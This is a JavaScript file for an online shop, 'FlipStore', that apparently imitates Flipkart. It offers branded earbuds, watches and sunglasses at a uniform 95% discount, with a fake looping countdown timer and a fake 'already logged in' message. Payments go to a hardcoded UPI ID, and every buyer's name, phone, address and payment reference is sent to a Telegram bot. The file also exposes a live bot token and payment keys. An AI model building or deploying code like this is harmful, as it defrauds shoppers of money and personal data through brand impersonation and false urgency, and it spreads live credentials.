console.log("FlipStore Script Loaded - Fixed Version");

// --- CONFIGURATION ---
const TELEGRAM_BOT_TOKEN = "6305172063:AAFHumurpK6wMV7K-6FZBg-DSKxwMuD4Vw0"; 
const TELEGRAM_CHAT_ID = "1815847082"; 
const RAZORPAY_KEY_ID = "rzp_live_RonN88BXEVP9eA"; 
const UPI_ID = "gpay-11265399414@okbizaxis"; 
const MERCHANT_NAME = "VR Shop";
const MERCHANT_CODE = "BCR2DN5TWTE6VMRU";

// --- PRODUCT DATA (Fixed Image Links) ---
const products = [
    { 
        id: 1, category: "Earbuds", name: "Aroma NB121 Pods", 
        fullName: "Aroma NB121 Pods Upto 40 Hours Playtime Type C Fast Charging",
        price: 2999, rating: 4.1, reviews: "12,403",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/d/u/0/nb121-pods-upto-40-hours-playtime-type-c-fast-charging-dual-original-imahh4a72k7jbk2h.jpeg?q=70"
    },
    { 
        id: 2, category: "Earbuds", name: "GOBOULT Z40", 
        fullName: "GOBOULT Z40 with ENC Mic, 60Hr Battery, Metal Finish", 
        price: 3499, rating: 4.3, reviews: "8,500",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/d/a/c/-original-imahebzzqs5fspcv.jpeg?q=70" 
    },
    {
        id: 3, category: "Earbuds", name: "OnePlus Nord Buds 3r", 
        fullName: "OnePlus Nord Buds 3r TWS Earbuds, 3D Audio, 2-mic call (Blue)", 
        price: 2299, rating: 4.5, reviews: "34,201",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/p/t/b/-original-imahf9daxb97keh5.jpeg?q=70" 
    },
    { 
        id: 4, category: "Earbuds", name: "Mivi Duopods B1", 
        fullName: "Mivi Duopods B1 (Just Launched) 45 Hours Playtime", 
        price: 1999, rating: 4.0, reviews: "2,100",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/k/k/r/-original-imaha9pgxwpfewtb.jpeg?q=70" 
    },
    { 
        id: 5, category: "Earbuds", name: "truke Buds Lite", 
        fullName: "truke Buds Lite with 60 Hours Playtime, Deep Bass", 
        price: 1599, rating: 3.9, reviews: "5,640",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/o/f/d/-original-imahgbn7hzywq3gm.jpeg?q=70" 
    },
    { 
        id: 6, category: "Earbuds", name: "OnePlus Nord Buds 3r", 
        fullName: "OnePlus Nord Buds 3r TWS Earbuds, Ash Black", 
        price: 2299, rating: 4.6, reviews: "31,090", 
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/7/n/o/-original-imahfsg7chmgrugu.jpeg?q=70" 
    },
    { 
        id: 7, category: "Sunglasses", name: "UV Wayfarer", 
        fullName: "UV Protection Wayfarer Sunglasses (Free Size) (Black)", 
        price: 999, rating: 4.2, reviews: "1,200", 
        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/v/9/p/free-size-com179-13-dervin-original-imahya4ekrznrmfb.jpeg?q=70" 
    },
    { 
        id: 8, category: "Sunglasses", name: "Retro Square", 
        fullName: "UV Protection Retro Square Round Sunglasses (Black)", 
        price: 1299, rating: 4.1, reviews: "850",
        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/h/l/p/free-dd-29a-bollywood-stylish-dkeraod-original-imahgq34aswzc2mq.jpeg?q=70" 
    },
    { 
        id: 9, category: "Sunglasses", name: "Riding Glasses", 
        fullName: "UV Protection Riding Glasses, Rectangle Sunglasses", 
        price: 799, rating: 3.8, reviews: "2,300",
        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/t/n/c/medium-goldrimless-spectaswag-original-imahfvfmmbjpfzkz.jpeg?q=70" 
    },
    { 
        id: 10, category: "Sunglasses", name: "Sport Wrap", 
        fullName: "UV Protection Wrap-Around Sports Sunglasses (Multicolor)", 
        price: 1499, rating: 4.4, reviews: "900", 
        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/2/p/o/medium-polarized-uv-protection-cycling-running-sports-unisex-original-imah9uezabpvc8gx.jpeg?q=70" 
    },
    { 
        id: 11, category: "Sunglasses", name: "Polarized Round", 
        fullName: "UV Protection Gradient Polarized Round Sunglasses (Black)", 
        price: 1999, rating: 4.3, reviews: "15,400",
        image: "https://rukminim2.flixcart.com/image/832/832/xif0q/sunglass/r/y/r/medium-pathan-sunglass-19r-rozti-original-imah2zgqxdgycugw.jpeg?q=70" 
    },
    { 
        id: 12, category: "Smartwatch", name: "Bolt Drift+", 
        fullName: "Bolt Drift+ 1.85, Bluetooth Calling, 500nits, 150+ Faces (White)", 
        price: 3999, rating: 4.8, reviews: "5,100",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/smartwatch/j/h/o/-original-imahejynzkuaaaty.jpeg?q=70" 
    },
    { 
        id: 13, category: "Smartwatch", name: "Samsung Galaxy 7", 
        fullName: "Samsung Galaxy Watch7 44mm LTE Smartwatch (Green Strap)", 
        price: 29999, rating: 4.0, reviews: "1,200",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/smartwatch/e/o/m/-original-imahghmjmftemu54.jpeg?q=70" 
    },
    { 
        id: 17, category: "Headset", name: "Bolt Z40 Pro", 
        fullName: "Bolt Z40 Pro with 100H Battery, Quad Mic ENC, Rubber Grip (Midnight)", 
        price: 2499, rating: 4.5, reviews: "3,400",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/headphone/u/6/u/-original-imahd2rhkgzwyuun.jpeg?q=70" 
    },
    { 
        id: 30, category: "Trimmer", name: "Zapkart Trimmer", 
        fullName: "Zapkart Trimmer pack of 1, 45 min Runtime (Black, Silver)", 
        price: 899, rating: 3.5, reviews: "2,780",
        image: "https://rukminim2.flixcart.com/image/416/416/xif0q/trimmer/e/0/2/0-5-8-mm-trimmer-packof-1-asfa-87-stainless-steel-corded-original-imahgz3azgshzyec.jpeg?q=70" 
    }
];

// --- VARIABLES ---
let currentProduct = null;
let currentPrice = 0;
let cart = []; 
let isCartOrder = false; 
let currentOrderID = "";

// --- UTILS ---
function getDiscountedPrice(price) { return Math.floor(price * 0.05); }

function showToast(message) {
    const box = document.getElementById('toast-box');
    if (!box) return;
    const toast = document.createElement('div');
    toast.className = 'toast';
    toast.innerHTML = `<i class="fas fa-info-circle" style="color:#2874f0"></i> ${message}`;
    box.appendChild(toast);
    setTimeout(() => { toast.remove(); }, 3000);
}

function showLoading() { 
    const loader = document.getElementById('loading-overlay');
    if(loader) loader.classList.remove('hidden'); 
}
function hideLoading() { 
    const loader = document.getElementById('loading-overlay');
    if(loader) loader.classList.add('hidden'); 
}

// --- RENDER FUNCTIONS ---
function renderCategories() {
    const nav = document.getElementById('category-nav');
    if (!nav) return;
    const categories = [...new Set(products.map(p => p.category))];
    categories.unshift("All");

    nav.innerHTML = categories.map(cat => {
        const product = products.find(p => p.category === cat) || products[0];
        const img = cat === "All" ? "https://rukminim1.flixcart.com/flap/128/128/image/f15c02bfeb02d15d.png?q=100" : product.image; 
        return `<div class="cat-item ${cat === 'All' ? 'active' : ''}" onclick="filterByCategory(this, '${cat}')"><div class="cat-img-box"><img src="${img}" class="cat-img"></div><span class="cat-name">${cat}</span></div>`;
    }).join('');
}

function filterByCategory(element, category) {
    document.querySelectorAll('.cat-item').forEach(el => el.classList.remove('active'));
    if(element) element.classList.add('active');

    const title = document.getElementById('section-title');
    if(category === "All") {
        if(title) title.innerText = "Deals of the Day";
        renderProducts(products);
    } else {
        if(title) title.innerText = `Top ${category}`;
        const filtered = products.filter(p => p.category === category);
        renderProducts(filtered);
    }
}

function renderProducts(productList = products) {
    const container = document.getElementById('product-container');
    if (!container) {
        console.error("ERROR: Product Container not found!");
        return;
    }
    container.innerHTML = '';

    if(!productList || productList.length === 0) {
        container.innerHTML = `<div style="grid-column: 1/-1; text-align: center; padding: 40px; color: #666;"><p>No products found.</p></div>`;
        return;
    }

    productList.forEach(product => {
        const discPrice = getDiscountedPrice(product.price);
        const card = document.createElement('div');
        card.className = 'product-card';
        card.innerHTML = `
            <div class="discount-badge">95% OFF</div>
            <img src="${product.image}" class="product-img" loading="lazy" onerror="this.src='https://placehold.co/300x300?text=Image+N/A'">
            <div class="product-title">${product.name}</div>
            <div class="product-rating-row">
                <div class="rating-badge">${product.rating} <i class="fas fa-star"></i></div>
                <span class="review-count">(${product.reviews})</span>
            </div>
            <div class="price-box">
                <span class="new-price">₹${discPrice}</span>
                <span class="old-price">₹${product.price}</span>
            </div>
        `;
        card.onclick = () => showProductDetail(product);
        container.appendChild(card);
    });
}

function showProductDetail(product) {
    history.pushState({view: 'product'}, '', '#product'); 
    currentProduct = product;
    currentPrice = getDiscountedPrice(product.price);
    isCartOrder = false;

    document.getElementById('home-view').style.display = 'none';
    document.getElementById('timer-section').style.display = 'none';
    const detailView = document.getElementById('product-detail-view');
    detailView.classList.remove('hidden');
    detailView.style.display = 'block';

    document.getElementById('detail-img').src = product.image;
    document.getElementById('detail-title').innerText = product.fullName;
    document.getElementById('detail-price').innerText = `₹${currentPrice}`;
    document.getElementById('detail-old-price').innerText = `₹${product.price}`;
    document.querySelector('.badge-star').innerHTML = `${product.rating} <i class="fas fa-star"></i>`;
    document.querySelector('.review-count').innerText = `${product.reviews} Ratings & Reviews`;

    window.scrollTo({ top: 0, behavior: 'auto' });
}

// --- CART LOGIC ---
function addToCart(product) {
    cart.push(product);
    showToast(`${product.name} added to cart!`);
    updateCartCount();
}

function updateCartCount() {
    const badge = document.querySelector('.cart-badge');
    if(badge) {
        badge.innerText = cart.length;
        badge.style.display = cart.length > 0 ? 'block' : 'none';
        badge.style.transform = 'scale(1.2)';
        setTimeout(() => badge.style.transform = 'scale(1)', 200);
    }
}

// --- CHECKOUT & PAYMENT ---
function startCheckout() {
    document.getElementById('step-address').classList.remove('hidden');
    document.getElementById('step-payment').classList.add('hidden');
    document.getElementById('input-name').value = '';
    document.getElementById('input-phone').value = '';
    document.getElementById('checkoutModal').style.display = 'flex';
}

function closeModal() {
    document.getElementById('checkoutModal').style.display = 'none';
    document.getElementById('utrModal').style.display = 'none';
}

function goToPayment() {
    const name = document.getElementById('input-name').value;
    const phone = document.getElementById('input-phone').value;
    const pin = document.getElementById('input-pincode').value;
    const addr = document.getElementById('input-addr').value;

    if(!name || !phone || !pin || !addr) { showToast("Please fill all details"); return; }
    window.userDetails = { name, phone, pincode: pin, addr };
    
    document.getElementById('step-address').classList.add('hidden');
    document.getElementById('step-payment').classList.remove('hidden');
    document.getElementById('payment-total').innerText = `₹${currentPrice}`;
}

function backToAddress() {
    document.getElementById('step-payment').classList.add('hidden');
    document.getElementById('step-address').classList.remove('hidden');
}

function initiatePayment() {
    const selected = document.querySelector('input[name="payment"]:checked').id;
    if (selected === 'online') {
        if (typeof Razorpay !== 'undefined') { showLoading(); startRazorpay(); } 
        else { showToast("Gateway unavailable. Using Manual Method."); startManualUPI(); }
    } else if (selected === 'manual_upi') {
        startManualUPI();
    }
}

function startRazorpay() {
    var options = {
        "key": RAZORPAY_KEY_ID, 
        "amount": Math.round(currentPrice * 100), 
        "currency": "INR",
        "name": "FlipStore",
        "description": isCartOrder ? "Bulk Order" : currentProduct.name,
        "image": "https://rukminim1.flixcart.com/www/800/800/promos/16/05/2019/d438a32e-765a-4d8b-b4a6-520b560971e8.png?q=90",
        "handler": function (response) { hideLoading(); completeOrder(response.razorpay_payment_id); },
        "prefill": { "name": window.userDetails.name, "contact": window.userDetails.phone },
        "theme": { "color": "#2874f0" },
        "modal": { "ondismiss": function() { hideLoading(); showToast("Payment Cancelled"); } }
    };
    try { var rzp1 = new Razorpay(options); rzp1.open(); closeModal(); } 
    catch (e) { hideLoading(); startManualUPI(); }
}

function startManualUPI() {
    currentOrderID = "ORD" + Math.floor(Math.random() * 1000000);
    const upiLink = `upi://pay?pa=${UPI_ID}&pn=${encodeURIComponent(MERCHANT_NAME)}&mc=${MERCHANT_CODE}&tr=${currentOrderID}&tn=Order ${currentOrderID}&am=${currentPrice}&cu=INR`;
    window.location.href = upiLink;
    setTimeout(() => {
        closeModal();
        document.getElementById('merchant-display').innerText = MERCHANT_NAME;
        document.getElementById('utrModal').style.display = 'flex';
    }, 2000);
}

function verifyUTR() {
    const utr = document.getElementById('utr-input').value.trim();
    if(utr.length < 10) { showToast("Enter valid 12-digit UTR"); return; }
    document.getElementById('utrModal').style.display = 'none';
    completeOrder(utr);
}

function completeOrder(refId) {
    const orderDetails = `NEW ORDER\n👤 ${window.userDetails.name}\n📱 ${window.userDetails.phone}\n🏠 ${window.userDetails.addr}\n🛒 ${isCartOrder ? 'Bulk' : currentProduct.name}\n💰 ₹${currentPrice}\n🆔 ${refId}`;
    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ chat_id: TELEGRAM_CHAT_ID, text: orderDetails })
    }).catch(e => console.log("Telegram Error", e));

    const successModal = document.getElementById('successModal');
    successModal.querySelector('.modal-content').innerHTML = `
        <div style="text-align:center;padding:30px;">
            <div style="font-size:60px;color:#388e3c;margin-bottom:20px;"><i class="fas fa-check-circle"></i></div>
            <h2 style="color:#212121;">Order Placed!</h2>
            <p style="color:#666;">ID: ${refId}</p>
            <button onclick="location.reload()" style="width:100%;background:#2874f0;color:white;padding:15px;border:none;margin-top:10px;">Continue</button>
        </div>`;
    successModal.style.display = 'flex';
    
    if(isCartOrder) { cart = []; updateCartCount(); }
}

// --- INIT ---
document.addEventListener('DOMContentLoaded', () => {
    // Back Button Handler
    window.addEventListener('popstate', () => {
        if(document.getElementById('product-detail-view').style.display === 'block') {
            document.getElementById('product-detail-view').style.display = 'none';
            document.getElementById('home-view').style.display = 'block';
            document.getElementById('timer-section').style.display = 'block';
        }
    });

    renderCategories();
    renderProducts();
    
    // Timer
    setInterval(() => {
        const now = Math.floor(Date.now() / 1000);
        const left = (8 * 60) - (now % (8 * 60));
        document.getElementById('timer').innerText = `${Math.floor(left/60).toString().padStart(2,'0')}:${(left%60).toString().padStart(2,'0')}`;
    }, 1000);

    // Event Listeners
    document.querySelector('.cart-btn').onclick = (e) => { 
        e.preventDefault(); 
        if(cart.length === 0) showToast("Cart is empty");
        else showToast("Cart feature coming in next update (Use Buy Now)"); 
    };

    const loginBtn = document.querySelector('.login-btn');
    if(loginBtn) loginBtn.addEventListener('click', () => { showToast("You are already logged in!"); });

    const searchInput = document.querySelector('.search-bar input');
    if(searchInput) {
        searchInput.addEventListener('input', (e) => {
            const q = e.target.value.toLowerCase().trim();
            if(q === "") return renderProducts(products);
            renderProducts(products.filter(p => p.name.toLowerCase().includes(q)));
        });
    }
});
